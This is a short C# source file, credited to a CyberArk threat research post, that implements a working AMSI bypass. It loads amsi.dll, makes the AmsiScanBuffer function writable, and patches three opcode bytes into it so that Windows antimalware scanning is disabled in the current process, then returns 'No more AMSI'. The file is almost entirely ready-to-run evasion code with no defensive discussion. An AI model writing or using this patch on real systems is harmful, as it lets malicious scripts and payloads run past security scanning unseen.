//based on: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace amsibypass
{
    public class amsibypass
    {
        public enum Protection : uint
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string ddltoLoad);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
                Protection flNewProtect, IntPtr lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        private static unsafe extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static string run()
        {
            IntPtr dllHandle = LoadLibrary("amsi.dll"); //load the amsi.dll
            if (dllHandle == null) return "error";

            //Get the AmsiScanBuffer function address
            IntPtr AmsiScanbufferAddr = GetProcAddress(dllHandle, "AmsiScanBuffer");
            if (AmsiScanbufferAddr == null) return "error";

            IntPtr OldProtection = Marshal.AllocHGlobal(4); //pointer to store the current AmsiScanBuffer memory protection

            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
            bool VirtualProtectRc = VirtualProtect(AmsiScanbufferAddr, 0x0015, Protection.PAGE_EXECUTE_READWRITE, OldProtection);
            if (VirtualProtectRc == false) return "error";

            //The new patch opcode
            var patch = new byte[] { 0x31, 0xff, 0x90 };

            //Setting a pointer to the patch opcode array (unmanagedPointer)
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(patch, 0, unmanagedPointer, 3);

            //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
            MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);

            return "No more AMSI";

        }
    }
}
